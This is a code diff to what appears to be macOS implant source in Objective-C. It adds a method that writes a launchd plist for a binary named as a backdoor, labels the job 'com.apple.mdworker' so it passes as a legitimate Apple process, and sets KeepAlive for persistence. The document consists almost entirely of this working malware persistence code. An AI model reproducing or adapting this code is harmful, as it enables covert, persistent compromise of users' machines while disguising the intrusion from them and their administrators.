@@ -81,6 +81,28 @@
   return TRUE;  
 }
 
+- (BOOL)recreateAgentPlist
+{
+  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
+  
+  NSString *backdoorUpdatePath = [NSString stringWithFormat: @"%@/%@",
+                                 [[NSBundle mainBundle] bundlePath], gBackdoorUpdateName];
+  NSDictionary *innerDict = 
+  [[NSDictionary alloc] initWithObjectsAndKeys:
+   @"com.apple.mdworker", @"Label",
+   [NSNumber numberWithBool: TRUE], @"KeepAlive",
+   [NSNumber numberWithInt: 3], @"ThrottleInterval",
+   [[NSBundle mainBundle] bundlePath], @"WorkingDirectory",
+   [NSArray arrayWithObjects: backdoorUpdatePath, nil], @"ProgramArguments", 
+   nil];
+  
+  [rootObj addEntriesFromDictionary: innerDict];
+  
+  [innerDict release];
+  
+  return [rootObj writeToFile: BACKDOOR_DAEMON_PLIST atomically: YES];
+}
+
 - (BOOL)updateAgentPlist
 {
   BOOL bRet;
@@ -187,8 +209,7 @@
     }
 
   
-  if ([self pseudoSignCore]   == TRUE &&
-      [self updateAgentPlist] == TRUE)
+  if ([self pseudoSignCore] == TRUE && [self recreateAgentPlist] == TRUE)
     {
       bRet = TRUE;
     }
